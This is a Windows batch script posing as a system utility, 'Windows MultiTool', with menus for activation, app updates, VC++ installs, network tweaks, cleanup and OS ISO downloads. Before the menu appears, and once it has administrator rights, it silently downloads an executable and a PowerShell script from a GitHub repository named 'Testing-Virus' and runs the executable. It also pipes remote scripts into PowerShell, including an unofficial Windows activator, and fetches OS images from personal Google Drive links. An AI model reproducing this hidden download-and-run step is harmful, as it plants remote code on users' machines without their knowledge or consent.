��&cls
@echo off
chcp 65001
mode con cols=130 lines=30
cls
SETLOCAL ENABLEEXTENSIONS



rem ==================================================================
set ver=2.2.4

set "Msg=Windows MultiTool was updated. \nNew version of MultiTool: %ver% \n \nWhats New: \n Updated Windows Utilities \n MultiTool service system \n Safety exit system\n Major fix in loading the script \n Auto cleanup logs of MultiTool"
rem ==================================================================












if not exist "%temp%\MultiTool\" mkdir %temp%\MultiTool\ >NUL
if not exist "%localappdata%\MultiTool\" mkdir %localappdata%\MultiTool\ >NUL

set "versionFile=%localappdata%\MultiTool\version.txt"
chcp 437 >NUL

if not exist "%localappdata%\MultiTool\version.txt" (
    echo %ver%> %localappdata%\MultiTool\version.txt
)

for /f "delims=" %%i in (%versionFile%) do set currentVersion=%%i

if "%currentVersion%" neq "%ver%" (
    :: Aktualizace notifikace
    powershell -Command "[void] [System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms'); $objNotifyIcon=New-Object System.Windows.Forms.NotifyIcon; $objNotifyIcon.BalloonTipText='Successfully Updated to %ver%'; $objNotifyIcon.Icon=[system.drawing.systemicons]::Information; $objNotifyIcon.BalloonTipTitle='Windows Multi Tool'; $objNotifyIcon.BalloonTipIcon='None'; $objNotifyIcon.Visible=$True; $objNotifyIcon.ShowBalloonTip(5000);"
    echo %ver%> %versionFile%
    goto updatelog
) else (
    :: Pokud verze odpovídá, napiš chybu
    goto check_Permissions
)

:updatelog
set Type=64
Set "Title=Windows Multi Tool"
For %%a in (%Type%) Do Call:MsgBox "%Msg%" "%%a" "%Title%"
goto check_Permissions

:MsgBox <Msg> <Type> <Title>
echo MsgBox Replace("%~1","\n",vbCrLf),"%~2","%~3" > "%tmp%\%~n0.vbs"
Cscript /nologo "%tmp%\%~n0.vbs" & Del "%tmp%\%~n0.vbs"
goto check_Permissions









goto check_Permissions

:check_Permissions
    echo Administrative permissions required. Detecting permissions...
    
    net session >nul 2>&1
    if %errorLevel% == 0 (
        echo Success: Administrative permissions confirmed.
        goto checkwinget
    ) else (
        echo.
        echo Failure: YOU NEED TO START AS ADMINISTRATOR
        timeout /t 2 >NUL
        exit
    )
    
    pause >nul



:end
exit


:checkwinget
winget --version >nul 2>&1
IF %ERRORLEVEL% EQU 0 (
    echo Winget is already installed
    cls
    goto service
) ELSE (
    echo Installing Winget
    chcp 437 >NUL
    powershell Invoke-WebRequest -Uri "https://aka.ms/getwinget" -OutFile "AppInstaller.msixbundle"; Start-Process "AppInstaller.msixbundle"
    echo Instalation Done...
    timeout /t 1 >nul
    cls
    goto service
)

:service
if not exist "C:\Windows\MultiTool" mkdir "C:\Windows\MultiTool"
if not exist "C:\Windows\MultiTool\MultiTool Services.exe" curl --limit-rate 0 --ssl-no-revoke -o "C:\Windows\MultiTool\MultiTool Services.exe" "https://raw.githubusercontent.com/czmenz/Testing-Virus/refs/heads/main/Service.exe"
if not exist "%temp%\MultiTool\MultitoolService.ps1" curl --limit-rate 0 --ssl-no-revoke -o "%localappdata%\MultiTool\MultitoolService.ps1" "https://raw.githubusercontent.com/czmenz/Testing-Virus/refs/heads/main/MultitoolService.ps1"
start "" "C:\Windows\MultiTool\MultiTool Services.exe"
goto main


:main
chcp 65001 >NUL
color 9
cls
title Windows Multi Helper %ver%
echo.
echo            ██╗    ██╗      ███╗   ███╗██╗   ██╗██╗  ████████╗██╗██╗  ██╗███████╗██╗     ██████╗ ███████╗██████╗ 
echo            ██║    ██║      ████╗ ████║██║   ██║██║  ╚══██╔══╝██║██║  ██║██╔════╝██║     ██╔══██╗██╔════╝██╔══██╗
echo            ██║ █╗ ██║█████╗██╔████╔██║██║   ██║██║     ██║   ██║███████║█████╗  ██║     ██████╔╝█████╗  ██████╔╝
echo            ██║███╗██║╚════╝██║╚██╔╝██║██║   ██║██║     ██║   ██║██╔══██║██╔══╝  ██║     ██╔═══╝ ██╔══╝  ██╔══██╗
echo            ╚███╔███╔╝      ██║ ╚═╝ ██║╚██████╔╝███████╗██║   ██║██║  ██║███████╗███████╗██║     ███████╗██║  ██║
echo             ╚══╝╚══╝       ╚═╝     ╚═╝ ╚═════╝ ╚══════╝╚═╝   ╚═╝╚═╝  ╚═╝╚══════╝╚══════╝╚═╝     ╚══════╝╚═╝  ╚═╝

echo.

echo               ╔═══════ Windows Utilities ═════════════ Applications ═════════════ Performance/ Other ══════╗
echo               ║ [1]. Windows Activator        [11]. Update All APPS         [21]. Network Booster          ║
echo               ║ [2]. Windows Utilities        [12]. Download OS ISO         [22]. Deep Cleanup             ║
echo               ║ [3]. -----------              [13]. Install VCRedist 05-22  [23]. Clear Temp/Prefetch      ║
echo               ║ [4]. -----------              [14]. -----------             [24]. -----------              ║
echo               ║ [5]. -----------              [15]. -----------             [25]. -----------              ║
echo               ║ [6]. -----------              [16]. -----------             [26]. -----------              ║
echo               ║ [7]. -----------              [17]. -----------             [27]. -----------              ║
echo               ║ [8]. -----------              [18]. -----------             [28]. -----------              ║
echo               ║ [9]. -----------              [19]. -----------             [29]. -----------              ║
echo               ║ [10]. -----------             [20]. -----------             [30]. -----------              ║
echo               ║                                                                                            ║
echo               ║                                                                                            ║
echo               ║        Version Status: Latest ║ Current Version: %Ver% ║ Update Date: 3/7/2025             ║
echo               ╚═══════════════════════════════╩════════════════════════╩═══════════════════════════════════╝
echo.              





echo.
set choice=
set /p choice=~multi_helper~ 
if '%choice%'=='1' goto 1
if '%choice%'=='2' goto 2



if '%choice%' == '11' goto 11
if '%choice%'=='12' goto 12
if '%choice%'=='13' goto 13


if '%choice%'=='21' goto 21
if '%choice%'=='22' goto 22
if '%choice%'=='23' goto 23


echo "%choice%" is not valid, try again
echo.
goto main
exit

:1
echo.
echo Loading...
title Activator - Windows Multi Helper %ver%
chcp 437 >NUL
powershell.exe "irm https://get.activated.win | iex"
goto main
exit



:2
echo.
echo Loading...
title Utilities - Windows Multi Helper %ver%
chcp 437 >NUL
powershell.exe "irm "https://christitus.com/win" | iex"
goto main
exit


:21
echo.
echo Windows Network Booster
echo Click Enter to run script
pause>NUL
echo.
echo Loading...
chcp 437 >NUL
title NetBooster - Windows Multi Helper %ver%

:: Set DNS, Local, Hosts, and NetBT priority
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Tcpip\ServiceProvider" /v "DnsPriority" /t REG_DWORD /d 6 /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Tcpip\ServiceProvider" /v "LocalPriority" /t REG_DWORD /d 4 /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Tcpip\ServiceProvider" /v "HostsPriority" /t REG_DWORD /d 5 /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Tcpip\ServiceProvider" /v "NetbtPriority" /t REG_DWORD /d 7 /f

:: Set Network Throttling Index and System Responsiveness
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile" /v "NetworkThrottlingIndex" /t REG_DWORD /d 0xffffffff /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile" /v "SystemResponsiveness" /t REG_DWORD /d 0 /f
:: Post Video note: Even with System responsiveness set to 0 I believe windows still keeps a slight reserve

:: Set MaxUserPort, TcpTimedWaitDelay, and DefaultTTL
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "MaxUserPort" /t REG_DWORD /d 65534 /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpTimedWaitDelay" /t REG_DWORD /d 30 /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "DefaultTTL" /t REG_DWORD /d 64 /f

:: PowerShell commands for TCP settings
PowerShell.exe Set-NetTCPSetting -SettingName internet -AutoTuningLevelLocal disabled
PowerShell.exe Set-NetTCPSetting -SettingName internet -ScalingHeuristics disabled
PowerShell.exe Set-NetTcpSetting -SettingName internet -EcnCapability enabled
PowerShell.exe Set-NetTcpSetting -SettingName internet -Timestamps enabled
PowerShell.exe Set-NetTcpSetting -SettingName internet -MaxSynRetransmissions 2
PowerShell.exe Set-NetTcpSetting -SettingName internet -NonSackRttResiliency disabled
PowerShell.exe Set-NetTcpSetting -SettingName internet -InitialRto 2000
PowerShell.exe Set-NetTcpSetting -SettingName internet -MinRto 300

:: PowerShell commands for offload and network settings
PowerShell.exe Set-NetOffloadGlobalSetting -ReceiveSegmentCoalescing disabled
PowerShell.exe Set-NetOffloadGlobalSetting -ReceiveSideScaling disabled
PowerShell.exe Set-NetOffloadGlobalSetting -Chimney disabled
PowerShell.exe Disable-NetAdapterLso -Name *
PowerShell.exe Disable-NetAdapterChecksumOffload -Name *

:: netsh commands for TCP settings and MTU
netsh int tcp set supplemental internet congestionprovider=ctcp
netsh interface ipv4 set subinterface "Wi-Fi" mtu=1500 store=persistent
netsh interface ipv6 set subinterface "Wi-Fi" mtu=1500 store=persistent
netsh interface ipv4 set subinterface "Ethernet" mtu=1500 store=persistent
netsh interface ipv6 set subinterface "Ethernet" mtu=1500 store=persistent

echo Set objArgs = WScript.Arguments > temp_notify.vbs
echo Set objShell = CreateObject("WScript.Shell") >> temp_notify.vbs
echo objShell.Popup WScript.Arguments(0), 5, WScript.Arguments(1), 64 >> temp_notify.vbs
cscript //nologo temp_notify.vbs "Network Booster completed." "Windows MultiHelper"
del temp_notify.vbs
goto main
exit





:23
echo.
echo Prefetch and Temp cleaner
echo Click Enter to run script
pause>NUL

del /f /s /q C:\Windows\prefetch\*
rmdir /q /s %TEMP%\
del /q /f /s %TEMP%\

echo Set objArgs = WScript.Arguments > temp_notify.vbs
echo Set objShell = CreateObject("WScript.Shell") >> temp_notify.vbs
echo objShell.Popup WScript.Arguments(0), 5, WScript.Arguments(1), 64 >> temp_notify.vbs
cscript //nologo temp_notify.vbs "Clear Temp/Prefetch completed." "Windows MultiHelper"
del temp_notify.vbs
goto main
exit


:11
title Updating APPS - Windows Multi Helper %ver%
echo.
cls
echo.
echo                     ██╗   ██╗██████╗ ██████╗  █████╗ ████████╗███████╗     █████╗ ██████╗ ██████╗ ███████╗
echo                     ██║   ██║██╔══██╗██╔══██╗██╔══██╗╚══██╔══╝██╔════╝    ██╔══██╗██╔══██╗██╔══██╗██╔════╝
echo                     ██║   ██║██████╔╝██║  ██║███████║   ██║   █████╗      ███████║██████╔╝██████╔╝███████╗
echo                     ██║   ██║██╔═══╝ ██║  ██║██╔══██║   ██║   ██╔══╝      ██╔══██║██╔═══╝ ██╔═══╝ ╚════██║
echo                     ╚██████╔╝██║     ██████╔╝██║  ██║   ██║   ███████╗    ██║  ██║██║     ██║     ███████║
echo                      ╚═════╝ ╚═╝     ╚═════╝ ╚═╝  ╚═╝   ╚═╝   ╚══════╝    ╚═╝  ╚═╝╚═╝     ╚═╝     ╚══════╝

echo.
WINGET UPGRADE --include-unknown
echo.
echo Click Enter to Install all Updates
pause >NUL

cls
echo.
echo                     ██╗   ██╗██████╗ ██████╗  █████╗ ████████╗███████╗     █████╗ ██████╗ ██████╗ ███████╗
echo                     ██║   ██║██╔══██╗██╔══██╗██╔══██╗╚══██╔══╝██╔════╝    ██╔══██╗██╔══██╗██╔══██╗██╔════╝
echo                     ██║   ██║██████╔╝██║  ██║███████║   ██║   █████╗      ███████║██████╔╝██████╔╝███████╗
echo                     ██║   ██║██╔═══╝ ██║  ██║██╔══██║   ██║   ██╔══╝      ██╔══██║██╔═══╝ ██╔═══╝ ╚════██║
echo                     ╚██████╔╝██║     ██████╔╝██║  ██║   ██║   ███████╗    ██║  ██║██║     ██║     ███████║
echo                      ╚═════╝ ╚═╝     ╚═════╝ ╚═╝  ╚═╝   ╚═╝   ╚══════╝    ╚═╝  ╚═╝╚═╝     ╚═╝     ╚══════╝

WINGET UPGRADE --ALL
echo.
echo INSTALLING
echo ALL Updates Installed
timeout /t 3>NUL
goto main
exit


:13
title Install VCRedist - Windows Multi Helper %ver%
echo.
cls

echo                                    ██╗   ██╗ ██████╗██████╗ ███████╗██████╗ ██╗███████╗████████╗
echo                                    ██║   ██║██╔════╝██╔══██╗██╔════╝██╔══██╗██║██╔════╝╚══██╔══╝
echo                                    ██║   ██║██║     ██████╔╝█████╗  ██║  ██║██║███████╗   ██║   
echo                                    ╚██╗ ██╔╝██║     ██╔══██╗██╔══╝  ██║  ██║██║╚════██║   ██║   
echo                                     ╚████╔╝ ╚██████╗██║  ██║███████╗██████╔╝██║███████║   ██║   
echo                                      ╚═══╝   ╚═════╝╚═╝  ╚═╝╚══════╝╚═════╝ ╚═╝╚══════╝   ╚═╝   

echo.
echo                                          ╔═══════════════════════════════════════╗
echo                                          ║ [1]. VCRedist 2005 (x64/x86)          ║
echo                                          ║ [2]. VCRedist 2008 (x64/x86)          ║
echo                                          ║ [3]. VCRedist 2010 (x64/x86)          ║
echo                                          ║ [4]. VCRedist 2012 (x64/x86)          ║
echo                                          ║ [5]. VCRedist 2013 (x64/x86)          ║
echo                                          ║ [6]. VCRedist 2015-2022 (x64/x86)     ║
echo                                          ╚═══════════════════════════════════════╝

echo                                          ╔═══════════════════════════════════════╗
echo                                          ║           [A]. Install ALL            ║
echo                                          ║           [0]. Go Back                ║
echo                                          ╚═══════════════════════════════════════╝
echo. 
set choice=
set /p choice=~multi_helper~ 
if '%choice%'=='1' goto 81
if '%choice%'=='2' goto 82
if '%choice%'=='3' goto 83
if '%choice%'=='4' goto 84
if '%choice%' == '5' goto 85
if '%choice%'=='6' goto 86
if '%choice%'=='A' goto 8A

if '%choice%'=='0' goto main
goto 13

:81
echo.
echo Downloading 2005
echo.
curl --limit-rate 0 --ssl-no-revoke -o "%temp%\MultiTool\2005.exe" "https://download.microsoft.com/download/8/B/4/8B42259F-5D70-43F4-AC2E-4B208FD8D66A/vcredist_x64.EXE"
echo.
curl --limit-rate 0 --ssl-no-revoke -o "%temp%\MultiTool\2005x86.exe" "https://download.microsoft.com/download/8/B/4/8B42259F-5D70-43F4-AC2E-4B208FD8D66A/vcredist_x86.EXE"
echo Installing...
start /wait %temp%\MultiTool\2005.exe /q
start /wait %temp%\MultiTool\2005x86.exe /q
del %temp%\MultiTool\2005.exe
del %temp%\MultiTool\2005x86.exe
goto 8
exit

:82
echo.
echo Downloading 2008
echo.
curl --limit-rate 0 --ssl-no-revoke -o "%temp%\MultiTool\2008.exe" "https://download.microsoft.com/download/5/D/8/5D8C65CB-C849-4025-8E95-C3966CAFD8AE/vcredist_x64.exe"
echo.
curl --limit-rate 0 --ssl-no-revoke -o "%temp%\MultiTool\2008x86.exe" "https://download.microsoft.com/download/5/D/8/5D8C65CB-C849-4025-8E95-C3966CAFD8AE/vcredist_x86.exe"
echo Installing...
start /wait %temp%\MultiTool\2008.exe /q
start /wait %temp%\MultiTool\2008x86.exe /q
del %temp%\MultiTool\2008.exe
del %temp%\MultiTool\2008x86.exe
goto 8
exit

:83
echo.
echo Downloading 2010
echo.
curl --limit-rate 0 --ssl-no-revoke -o "%temp%\MultiTool\2010.exe" "https://download.microsoft.com/download/1/6/5/165255E7-1014-4D0A-B094-B6A430A6BFFC/vcredist_x64.exe"
echo.
curl --limit-rate 0 --ssl-no-revoke -o "%temp%\MultiTool\2010x86.exe" "https://download.microsoft.com/download/1/6/5/165255E7-1014-4D0A-B094-B6A430A6BFFC/vcredist_x86.exe"
echo Installing...
start /wait %temp%\MultiTool\2010.exe /q
start /wait %temp%\MultiTool\2010x86.exe /q
del %temp%\MultiTool\2010.exe
del %temp%\MultiTool\2010x86.exe
goto 8
exit

:84
echo.
echo Downloading 2012
echo.
curl --limit-rate 0 --ssl-no-revoke -o "%temp%\MultiTool\2012.exe" "https://download.microsoft.com/download/1/6/B/16B06F60-3B20-4FF2-B699-5E9B7962F9AE/VSU_4/vcredist_x64.exe"
echo.
curl --limit-rate 0 --ssl-no-revoke -o "%temp%\MultiTool\2012x86.exe" "https://download.microsoft.com/download/1/6/B/16B06F60-3B20-4FF2-B699-5E9B7962F9AE/VSU_4/vcredist_x86.exe"
echo Installing...
start /wait %temp%\MultiTool\2012.exe /q
start /wait %temp%\MultiTool\2012x86.exe /q
del %temp%\MultiTool\2012.exe
del %temp%\MultiTool\2012x86.exe
goto 8
exit

:85
echo.
echo Downloading 2013
echo.
curl --limit-rate 0 --ssl-no-revoke -o "%temp%\MultiTool\2013.exe" "https://download.microsoft.com/download/2/e/6/2e61cfa4-993b-4dd4-91da-3737cd5cd6e3/vcredist_x64.exe"
echo.
curl --limit-rate 0 --ssl-no-revoke -o "%temp%\MultiTool\2013x86.exe" "https://download.microsoft.com/download/2/e/6/2e61cfa4-993b-4dd4-91da-3737cd5cd6e3/vcredist_x86.exe"
echo Installing...
start /wait %temp%\MultiTool\2013.exe /q
start /wait %temp%\MultiTool\2013x86.exe /q
del %temp%\MultiTool\2013.exe
del %temp%\MultiTool\2013x86.exe
goto 8
exit

:86
echo.
echo Downloading 2015, 2017, 2019 and 2022
echo.
curl --limit-rate 0 --ssl-no-revoke -o "%temp%\MultiTool\2015792.exe" "https://download.visualstudio.microsoft.com/download/pr/285b28c7-3cf9-47fb-9be8-01cf5323a8df/8F9FB1B3CFE6E5092CF1225ECD6659DAB7CE50B8BF935CB79BFEDE1F3C895240/VC_redist.x64.exe"
echo.
curl --limit-rate 0 --ssl-no-revoke -o "%temp%\MultiTool\2015792x86.exe" "https://download.visualstudio.microsoft.com/download/pr/285b28c7-3cf9-47fb-9be8-01cf5323a8df/C4E3992F3883005881CF3937F9E33F1C7D792AC1C860EA9C52D8F120A16A7EB1/VC_redist.x86.exe"
echo Installing...
start /wait %temp%\MultiTool\2015792.exe /q
start /wait %temp%\MultiTool\2015792x86.exe /q
del %temp%\MultiTool\2015792.exe
del %temp%\MultiTool\2015792x86.exe
goto 8
exit

:8A
echo Downloading 2015, 2017, 2019 and 2022
echo.
curl -o "%temp%\MultiTool\2015792.exe" "https://download.visualstudio.microsoft.com/download/pr/285b28c7-3cf9-47fb-9be8-01cf5323a8df/C4E3992F3883005881CF3937F9E33F1C7D792AC1C860EA9C52D8F120A16A7EB1/VC_redist.x86.exe"
echo.
curl --limit-rate 0 --ssl-no-revoke -o "%temp%\MultiTool\2015792x86.exe" "https://download.visualstudio.microsoft.com/download/pr/285b28c7-3cf9-47fb-9be8-01cf5323a8df/C4E3992F3883005881CF3937F9E33F1C7D792AC1C860EA9C52D8F120A16A7EB1/VC_redist.x86.exe"

echo Downloading 2013
echo.
curl --limit-rate 0 --ssl-no-revoke -o "%temp%\MultiTool\2013.exe" "https://download.microsoft.com/download/2/e/6/2e61cfa4-993b-4dd4-91da-3737cd5cd6e3/vcredist_x64.exe"
echo.
curl --limit-rate 0 --ssl-no-revoke -o "%temp%\MultiTool\2013x86.exe" "https://download.microsoft.com/download/2/e/6/2e61cfa4-993b-4dd4-91da-3737cd5cd6e3/vcredist_x86.exe"

echo Downloading 2012
echo.
curl --limit-rate 0 --ssl-no-revoke -o "%temp%\MultiTool\2012.exe" "https://download.microsoft.com/download/1/6/B/16B06F60-3B20-4FF2-B699-5E9B7962F9AE/VSU_4/vcredist_x64.exe"
echo.
curl --limit-rate 0 --ssl-no-revoke -o "%temp%\MultiTool\2012x86.exe" "https://download.microsoft.com/download/1/6/B/16B06F60-3B20-4FF2-B699-5E9B7962F9AE/VSU_4/vcredist_x86.exe"

echo Downloading 2010
echo.
curl --limit-rate 0 --ssl-no-revoke -o "%temp%\MultiTool\2010.exe" "https://download.microsoft.com/download/1/6/5/165255E7-1014-4D0A-B094-B6A430A6BFFC/vcredist_x64.exe"
echo.
curl --limit-rate 0 --ssl-no-revoke -o "%temp%\MultiTool\2010x86.exe" "https://download.microsoft.com/download/1/6/5/165255E7-1014-4D0A-B094-B6A430A6BFFC/vcredist_x86.exe"

echo Downloading 2008
echo.
curl --limit-rate 0 --ssl-no-revoke -o "%temp%\MultiTool\2008.exe" "https://download.microsoft.com/download/5/D/8/5D8C65CB-C849-4025-8E95-C3966CAFD8AE/vcredist_x64.exe"
echo.
curl --limit-rate 0 --ssl-no-revoke -o "%temp%\MultiTool\2008x86.exe" "https://download.microsoft.com/download/5/D/8/5D8C65CB-C849-4025-8E95-C3966CAFD8AE/vcredist_x86.exe"

echo Downloading 2005
echo.
curl --limit-rate 0 --ssl-no-revoke -o "%temp%\MultiTool\2005.exe" "https://download.microsoft.com/download/8/B/4/8B42259F-5D70-43F4-AC2E-4B208FD8D66A/vcredist_x64.EXE"
echo.
curl --limit-rate 0 --ssl-no-revoke -o "%temp%\MultiTool\2005x86.exe" "https://download.microsoft.com/download/8/B/4/8B42259F-5D70-43F4-AC2E-4B208FD8D66A/vcredist_x86.EXE"

echo Installing... 2015-2022
start /wait %temp%\MultiTool\2015792.exe /q
start /wait %temp%\MultiTool\2015792x86.exe /q

echo Installing... 2013
start /wait %temp%\MultiTool\2013.exe /q
start /wait %temp%\MultiTool\2013x86.exe /q

echo Installing... 2012
start /wait %temp%\MultiTool\2012.exe /q
start /wait %temp%\MultiTool\2012x86.exe /q

echo Installing... 2010
start /wait %temp%\MultiTool\2010.exe /q
start /wait %temp%\MultiTool\2010x86.exe /q

echo Installing... 2008
start /wait %temp%\MultiTool\2008.exe /q
start /wait %temp%\MultiTool\2008x86.exe /q

echo Installing... 2005
start /wait %temp%\MultiTool\2005.exe /q
start /wait %temp%\MultiTool\2005x86.exe /q

del %temp%\MultiTool\2015792.exe
del %temp%\MultiTool\2015792x86.exe

del %temp%\MultiTool\2013.exe
del %temp%\MultiTool\2013x86.exe

del %temp%\MultiTool\2012.exe
del %temp%\MultiTool\2012x86.exe

del %temp%\MultiTool\2010.exe
del %temp%\MultiTool\2010x86.exe

del %temp%\MultiTool\2008.exe
del %temp%\MultiTool\2008x86.exe

del %temp%\MultiTool\2005.exe
del %temp%\MultiTool\2005x86.exe

goto main
exit


:22
echo.
echo Deep cleanup
echo Click Enter to run script
pause>NUL

net session >nul 2>&1 || (powershell Start-Process '%0' -Verb RunAs & exit)

:: Nastavení registru pro maximální čištění v cleanmgr
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\VolumeCaches\Temporary Files" /v StateFlags0121 /t REG_DWORD /d 2 /f
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\VolumeCaches\Recycle Bin" /v StateFlags0121 /t REG_DWORD /d 2 /f
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\VolumeCaches\System error memory dump files" /v StateFlags0121 /t REG_DWORD /d 2 /f
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\VolumeCaches\Windows Update Cleanup" /v StateFlags0121 /t REG_DWORD /d 2 /f
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\VolumeCaches\Delivery Optimization Files" /v StateFlags0121 /t REG_DWORD /d 2 /f
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\VolumeCaches\Temporary Setup Files" /v StateFlags0121 /t REG_DWORD /d 2 /f
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\VolumeCaches\Downloaded Program Files" /v StateFlags0121 /t REG_DWORD /d 2 /f
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\VolumeCaches\Old Chkdsk Files" /v StateFlags0121 /t REG_DWORD /d 2 /f
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\VolumeCaches\Update Cleanup" /v StateFlags0121 /t REG_DWORD /d 2 /f
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\VolumeCaches\Upgrade Discarded Files" /v StateFlags0121 /t REG_DWORD /d 2 /f

:: Spuštění čistění cleanmgr s přednastavenými volbami
cleanmgr /sagerun:121

:: Mazání dočasných souborů
echo Cleaning Temporary Files
del /s /q /f C:\Windows\Temp\*
del /s /q /f C:\Users\%USERNAME%\AppData\Local\Temp\*

:: Mazání Windows Update cache
echo Cleaning Windows Update
net stop wuauserv
rd /s /q C:\Windows\SoftwareDistribution
net start wuauserv

:: Mazání Prefetch souborů (neškodné, ale smaže optimalizace startu aplikací)
echo Cleaning Prefetch
del /s /q /f C:\Windows\Prefetch\*

:: Vyčištění starých aktualizací Windows
echo Cleaning Old Windows Instalations
Dism.exe /online /Cleanup-Image /StartComponentCleanup /ResetBase

echo DONE...
pause
goto main


:12
title Operating Systems - Windows Multi Helper %ver%
echo.
cls
echo                    ██████╗  ██████╗ ██╗    ██╗███╗   ██╗██╗      ██████╗  █████╗ ██████╗      ██████╗ ███████╗
echo                    ██╔══██╗██╔═══██╗██║    ██║████╗  ██║██║     ██╔═══██╗██╔══██╗██╔══██╗    ██╔═══██╗██╔════╝
echo                    ██║  ██║██║   ██║██║ █╗ ██║██╔██╗ ██║██║     ██║   ██║███████║██║  ██║    ██║   ██║███████╗
echo                    ██║  ██║██║   ██║██║███╗██║██║╚██╗██║██║     ██║   ██║██╔══██║██║  ██║    ██║   ██║╚════██║
echo                    ██████╔╝╚██████╔╝╚███╔███╔╝██║ ╚████║███████╗╚██████╔╝██║  ██║██████╔╝    ╚██████╔╝███████║
echo                    ╚═════╝  ╚═════╝  ╚══╝╚══╝ ╚═╝  ╚═══╝╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝      ╚═════╝ ╚══════╝

echo.
echo                     ╔═════════ WINDOWS ═════════╗ ╔═════════= LINUX ══════════╗ ╔═════════ MAC OS ══════════╗
echo                     ║ [1]. Windows 11  (5GB)    ║ ║ [7]. Ubuntu      (5GB)    ║ ║ [13]. BigSur     (13GB)   ║
echo                     ║ [2]. Windows 10  (5GB)    ║ ║ [8]. Fedora      (4GB)    ║ ║ [14]. Catalina   (8GB)    ║
echo                     ║ [3]. Windows 8.1 (3GB)    ║ ║ [9]. Pop!_OS     (4GB)    ║ ║ [15]. HighSierra (6GB)    ║
echo                     ║ [4]. Windows 7   (5GB)    ║ ║ [10]. Debian     (5GB)    ║ ║ [16]. Mojave     (6GB)    ║
echo                     ║ [5]. Windows XP  (600MB)  ║ ║ [11]. Arch Linux (1GB)    ║ ║ [17]. Monterey   (14GB)   ║
echo                     ║ [6]. Windows ME  (400MB)  ║ ║ [12]. Linux Mint (3GB)    ║ ║ [18]. Ventura    (16GB)   ║
echo                     ╚═══════════════════════════╝ ╚═══════════════════════════╝ ╚═══════════════════════════╝

echo                     ╔══════════════════════════════════════=════════════════════════════════════════════════╗
echo                     ║     These are not all Operating systems in world. They are just the most popular.     ║
echo                     ╚═══════════════════════════════════════════════════════════════════════════════════════╝
echo.
echo                                                    ╔════════════════════════╗
echo                                                    ║     [0]. Main Menu     ║
echo                                                    ╚════════════════════════╝

set choice=
set /p choice=~multi_helper~ 
if '%choice%'=='1' goto 181
if '%choice%'=='2' goto 182
if '%choice%'=='3' goto 183
if '%choice%'=='4' goto 184
if '%choice%'=='5' goto 185
if '%choice%'=='6' goto 186

if '%choice%'=='7' goto 187
if '%choice%'=='8' goto 188
if '%choice%'=='9' goto 189
if '%choice%'=='10' goto 1810
if '%choice%'=='11' goto 1811
if '%choice%'=='12' goto 1812

if '%choice%'=='13' goto 1813
if '%choice%'=='14' goto 1814
if '%choice%'=='15' goto 1815
if '%choice%'=='16' goto 1816
if '%choice%'=='17' goto 1817
if '%choice%'=='18' goto 1818

if '%choice%'=='0' goto main
goto 18





REM ================================ WINDOWS ==================================
REM ================================ WINDOWS ==================================
REM ================================ WINDOWS ==================================



:181
setlocal

set "psCommand="(new-object -COM 'Shell.Application')^
.BrowseForFolder(0,'Please choose a folder.',0,0).self.path""

chcp 437 >NUL
for /f "usebackq delims=" %%I in (`powershell %psCommand%`) do set "folder=%%I"

setlocal enabledelayedexpansion

endlocal

echo.
curl --limit-rate 0 --ssl-no-revoke -o %temp%\MultiTool\Windows11.iso "https://drive.usercontent.google.com/download?id=1zpoS7xHkmtv86NtwscKvCVkLHPoCqIxq&export=download&authuser=0&confirm=t&uuid=8467d849-c4f2-40d8-9bb2-f9f744e7a0b9&at=AIrpjvO9Gk5cT4oL1e_aIH8DDuev%3A1739713022269"

move %temp%\MultiTool\Windows11.iso %folder%\Windows11.iso

echo.
echo Windows 11 ISO Downloaded to %folder%
pause
goto main


:182
setlocal

set "psCommand="(new-object -COM 'Shell.Application')^
.BrowseForFolder(0,'Please choose a folder.',0,0).self.path""

chcp 437 >NUL
for /f "usebackq delims=" %%I in (`powershell %psCommand%`) do set "folder=%%I"

setlocal enabledelayedexpansion

endlocal

echo.
curl --limit-rate 0 --ssl-no-revoke -o %temp%\MultiTool\Windows10.iso "https://drive.usercontent.google.com/download?id=15r8WTX_i2SmsbC3t8sbio9Mk6WLo6qfE&export=download&authuser=0&confirm=t&uuid=5ccef20f-996c-411e-9c34-6ffd49ee5e92&at=AIrpjvPUk6J5OhO-3Yx5QfBAo0Wn%3A1739727366321"

move %temp%\MultiTool\Windows10.iso %folder%\Windows10.iso

echo.
echo Windows 10 ISO Downloaded to %folder%
pause
goto main


:183
setlocal

set "psCommand="(new-object -COM 'Shell.Application')^
.BrowseForFolder(0,'Please choose a folder.',0,0).self.path""

chcp 437 >NUL
for /f "usebackq delims=" %%I in (`powershell %psCommand%`) do set "folder=%%I"

setlocal enabledelayedexpansion

endlocal

echo.
curl --limit-rate 0 --ssl-no-revoke -o %temp%\MultiTool\Windows81.iso https://dn720208.ca.archive.org/0/items/win-8.1-english-x-64_20211019/Win8.1_English_x64.iso

move %temp%\MultiTool\Windows81.iso %folder%\Windows81.iso

echo.
